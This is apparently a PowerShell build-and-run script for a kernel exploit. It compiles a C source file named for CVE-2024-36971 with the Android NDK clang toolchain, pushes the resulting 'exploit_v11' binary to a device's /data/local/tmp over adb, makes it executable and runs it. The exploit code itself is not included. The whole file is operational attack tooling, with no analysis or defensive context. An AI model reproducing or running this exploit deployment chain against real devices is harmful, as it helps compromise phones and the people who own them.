$NDK = "C:\Users\<USER>\AppData\Local\Android\Sdk\ndk\29.0.14206865"
$CC = "$NDK\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android31-clang.cmd"
$SRC = "cve_2024_36971_v11.c"
$BIN = "exploit_v11"

Write-Host "[*] Compiling $SRC ..."
& $CC -static -O2 -pthread -o $BIN $SRC
if ($LASTEXITCODE -ne 0) {
    Write-Error "Compilation Failed!"
    exit
}

Write-Host "[*] Pushing to device..."
adb push $BIN /data/local/tmp/
adb shell "chmod +x /data/local/tmp/$BIN"

Write-Host "[*] Running exploit..."
adb shell "/data/local/tmp/$BIN"
